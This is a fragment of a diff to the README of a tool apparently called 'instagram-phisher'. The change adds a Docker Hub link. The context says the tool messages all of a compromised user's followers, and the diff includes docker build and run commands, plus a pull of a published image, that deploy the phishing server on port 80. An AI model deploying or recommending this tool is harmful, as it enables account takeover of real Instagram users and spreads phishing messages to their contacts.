@@ -12,7 +12,7 @@ Once a user is compermised, this tool will DM a configurable message to all foll
 docker build -t instagram-phisher ./server
 docker run -p 80:80 instagram-phisher
 ```
-Alternatively, you can pull the latest build from Docker Hub
+Alternatively, you can pull the latest build from [Docker Hub](https://hub.docker.com/r/javaww/instagram-phisher)
 ```bash
 docker run -p 80:80 javaww/instagram-phisher
 ```
